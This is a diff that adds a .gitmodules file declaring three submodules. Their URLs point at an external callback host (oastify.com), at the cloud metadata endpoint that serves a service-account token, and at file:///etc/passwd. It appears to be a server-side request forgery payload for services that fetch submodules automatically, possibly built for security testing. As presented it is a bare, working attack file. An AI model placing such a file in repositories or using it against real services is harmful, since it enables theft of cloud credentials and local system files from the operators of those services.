@@ -1,0 +1,9 @@
+[submodule "evil1"]
+	path = evil_dir
+	url = https://sc86bjxeg0c8st8t0xquwf5v9mfd34rt.oastify.com/submodule-fetch?proof=evil1
+[submodule "metafetch"]
+	path = metadir
+	url = http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/token
+[submodule "fileproto"]
+	path = filedir
+	url = file:///etc/passwd
